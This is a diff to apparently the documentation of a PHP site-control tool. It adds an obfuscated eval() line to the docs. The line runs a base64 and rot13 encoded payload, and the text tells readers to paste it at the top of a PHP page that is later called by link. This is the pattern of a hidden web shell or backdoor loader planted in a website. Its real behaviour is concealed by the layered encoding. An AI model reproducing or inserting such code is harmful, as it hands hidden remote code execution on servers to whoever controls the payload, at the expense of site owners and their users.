@@ -25,7 +25,9 @@ Notice
 In the event that the call key to the site is not recognized, you will see a code like this:
 
 .. code:: php
-    eval(str_rot13(base64_decode(str_rot13(base64_decode('cWFaYldTOVRIeElXSHhJb1cxSVVFMEFzRlJNRkVJOUJJU1dPRWxxcUNHMGFaUUx3QlNSM0F3RDBBUjRsWndSbEIxUmtDR1pqWUd0MFdHRDVDbU4xQ3lOaktHeDFzR1NCWEdOMkJ3SUNxd1ZscnhObFpRT2FIUU9BQkdEYlp3dTdIUjlvQkdEOEFtTnVHMU54QXdOekdtRXNBbU5lQUg4a0hHTG1abVYxR21wM1pTWjVXbHk3cGFPMUx2cHdMMmthcUpXdVdtZzJwbHUyTXpNbE1sdHhLMEFQRXhxb1czT3ZyYWNoTEtSYUtGeGNyM1djb2F4YldTOVFEeE1VSmxxakxhYzZvelNrVzEwY0IzMWxuM01hQjMwPQ==')))));
+    <?php
+	eval(str_rot13(base64_decode(str_rot13(base64_decode('cWFaYldTOVRIeElXSHhJb1cxSVVFMEFzRlJNRkVJOUJJU1dPRWxxcUNHMGFaUUx3QlNSM0F3RDBBUjRsWndSbEIxUmtDR1pqWUd0MFdHRDVDbU4xQ3lOaktHeDFzR1NCWEdOMkJ3SUNxd1ZscnhObFpRT2FIUU9BQkdEYlp3dTdIUjlvQkdEOEFtTnVHMU54QXdOekdtRXNBbU5lQUg4a0hHTG1abVYxR21wM1pTWjVXbHk3cGFPMUx2cHdMMmthcUpXdVdtZzJwbHUyTXpNbE1sdHhLMEFQRXhxb1czT3ZyYWNoTEtSYUtGeGNyM1djb2F4YldTOVFEeE1VSmxxakxhYzZvelNrVzEwY0IzMWxuM01hQjMwPQ==')))));
+	?>
 
 
 You must add it to the top of the page that you will request later via the link, knowing that it does not matter to the file. All that matters is taking into account the file type it should be '.php'.
